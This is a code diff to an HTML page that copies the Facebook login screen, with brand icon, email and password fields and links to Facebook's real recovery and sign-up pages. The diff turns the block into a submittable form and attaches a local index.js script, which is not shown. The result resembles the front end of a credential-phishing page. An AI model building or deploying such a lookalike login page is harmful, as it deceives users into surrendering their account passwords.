@@ -10,7 +10,7 @@
 <body>
   <div class="container">
     <img src="https://icon-library.com/images/facebook-icon-png-transparent/facebook-icon-png-transparent-6.jpg"/>
-      <div class="container-form">
+      <form class="container-form" id="form">
         <p>Log Into Facebook</p>
         <input
           id="input"
@@ -22,12 +22,15 @@
           type="password"
           placeholder="Password"
         />
-        <button>Log In</button>
+        <button type="submit">Log In</button>
         <div class="container-interno-ref">
           <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgot Account?</a>
           <a href="https://www.facebook.com/r.php?locale=en_US&display=page">Sign up for Facebook</a>
         </div> 
-    </div>
+    </form>
   </div>
+
+  <script src="./index.js"></script>
+  
 </body>
 </html>
